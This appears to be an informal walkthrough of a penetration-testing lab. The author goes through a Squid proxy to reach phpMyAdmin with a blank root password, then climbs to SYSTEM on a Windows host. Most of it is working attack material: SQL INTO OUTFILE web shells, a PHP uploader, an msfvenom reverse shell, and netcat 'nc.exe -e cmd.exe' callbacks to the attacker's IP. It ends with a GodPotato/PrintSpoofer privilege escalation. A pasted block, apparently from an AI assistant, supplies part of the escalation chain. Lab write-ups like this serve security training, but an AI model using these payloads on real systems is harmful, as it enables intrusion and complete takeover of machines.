This lab demonstrates using a Squid proxy to enumerate open ports on a target and gain initial access via phpMyAdmin with default credentials. Learners will escalate privileges by recovering restricted LOCAL SERVICE privileges through scheduled tasks. Finally, they will exploit the SeImpersonatePrivilege using PrintSpoofer to achieve a SYSTEM shell. This lab emphasizes proxy exploitation, privilege recovery, and abuse of impersonation rights.

- Enumerate open ports behind the Squid proxy to identify accessible services.
- Exploit phpMyAdmin to upload a web shell and establish a reverse shell as LOCAL SERVICE.
- Recover default LOCAL SERVICE privileges using a scheduled task.
- Enable the SeImpersonatePrivilege via a scheduled task with a crafted Principal.
- Use PrintSpoofer to exploit SeImpersonatePrivilege and achieve SYSTEM-level access.


ok lets go!!!

```
nmap -sV -sC -T4 -oA initial 192.168.52.189


???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial 192.168.52.189
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 02:07 +0000
Nmap scan report for 192.168.52.189
Host is up (0.00050s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3128/tcp open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-31T02:07:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.37 seconds
                                                                                                          
```



```
# curl through the proxy
curl -x http://192.168.52.189:3128 http://127.0.0.1/ #nope
curl -x http://192.168.52.189:3128 http://127.0.0.1:8080/ # HIT!!!!
curl -x http://192.168.52.189:3128 http://192.168.52.189:80/
```

So, `curl -x http://192.168.52.189:3128 http://127.0.0.1:8080/` works.

going to set up firefox to use foxyproxy.

okay. so I need to navigate to http://192.168.52.189:8080. duh. I was trying localhost. oops!

phpinfo. got it.

http://192.168.53.189:8080/?phpinfo=-1

lots of data. too many rabbit holes.

allow_url_fopen	On	On

okay. web shell?

later.

http://192.168.53.189:8080/phpmyadmin/

user: root
password: `<BLANK>`

yep. we can login to phpmyadmin.

maybe we can execute commands.

```
SELECT "<? echo passthru($_GET['pwd']); ?>" INTO OUTFILE 'C:/shell.php' 

USE information_schema;
SELECT load_file("C:/shell.php") from information_schema
```

nope.

```

    index
    next |
    phpMyAdmin 5.0.2 documentation » 
```


let's look for phpmyadmin 5.0.2 vulns.

	DOCUMENT_ROOT 	C:/wamp/www

we can create a webshell.

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:/wamp/www/shell.php"
```

then we visit this page with foxyproxy:

```
http://192.168.53.189:8080/shell.php?cmd=dir
```

we have non-root access now.

let's also make an uploader file so we can upload a proper web shell.

later, we will modify a webshell from `/usr/share/webshells/php/`.

```
SELECT   
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"  
INTO OUTFILE 'C:/wamp/www/uploader.php';

```

now we can upload a webshell. we need to modify the IP in `/usr/share/webshells/php/php-reverse-shell.php` to match the attacker.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./
#(nano edit file) add IP, change shell to cmd.exe

http://192.168.53.189:8080/uploader.php

# on attacker
nc -nvlp 1234

# visit on victim
http://192.168.53.189:8080/php-reverse-shell.php
```

okay, this failed. we should use msfvenom.

```bash
msfvenom -p php/reverse_php LHOST=192.168.49.53 LPORT=4444 -f raw > shell.php

# upload
http://192.168.53.189:8080/uploader.php

# on attacker
nc -nvlp 4444

# visit on victim
http://192.168.53.189:8080/shell.php
```

works! We have local service.

```
whoami
nt authority\local service
```

now, how do we pivot to root?

```
- Recover default LOCAL SERVICE privileges using a scheduled task.
- Enable the SeImpersonatePrivilege via a scheduled task with a crafted Principal.
- Use PrintSpoofer to exploit SeImpersonatePrivilege and achieve SYSTEM-level access.
```

okay. claude says:

```
● You've got a shell as nt authority\local service and need to escalate to SYSTEM. The path is:

  1. Recover LOCAL SERVICE privileges via scheduled task — LOCAL SERVICE often runs with stripped privileges. You need
  to restore the default token (including SeImpersonatePrivilege) by running a scheduled task that spawns a new process
  under the same account.

  2. Create a scheduled task with the NT AUTHORITY\LOCAL SERVICE principal:
  schtasks /create /tn "privesc" /tr "C:\wamp\www\shell.php" /sc onstart /ru "NT AUTHORITY\LOCAL SERVICE"
  3. Better approach — upload nc.exe or another reverse shell binary, then:
  schtasks /create /tn "privesc" /tr "C:\wamp\www\nc.exe -e cmd.exe 192.168.49.53 5555" /sc onstart /ru "NT
  AUTHORITY\LOCAL SERVICE"
  schtasks /run /tn "privesc"
  4. Catch the new shell — it should have the full LOCAL SERVICE token with SeImpersonatePrivilege.
  5. Verify SeImpersonatePrivilege is now present:
  whoami /priv
  6. Use PrintSpoofer for SYSTEM:
    - Upload PrintSpoofer64.exe (from https://github.com/itm4n/PrintSpoofer/releases)
    - Run:
  PrintSpoofer64.exe -i -c cmd.exe
  Or for a reverse shell:
  PrintSpoofer64.exe -c "nc.exe 192.168.49.53 6666 -e cmd.exe"

  Key things to upload to C:\wamp\www\ via your uploader.php:
  - nc.exe (for the privilege-restored shell)
  - PrintSpoofer64.exe

  What's your current status — do you still have the local service shell active, or did it die?
```

```bash
# on victim, to find .net version
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s

# on attacker, then upload through uploader.php
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
cp GodPotato-NET4.exe GodPotato.exe
file GodPotato.exe

wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
file FullPowers.exe

wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe
file nc.exe

# upload all 3 files.

# start new listener on attacker
nc -nvlp 6666

# as victim
copy C:\wamp\www\nc.exe C:\Windows\Temp\nc.exe
GodPotato.exe -cmd "C:\Windows\Temp\nc.exe 192.168.49.53 6666 -e cmd.exe"
whoami

```

pwned. writeup time...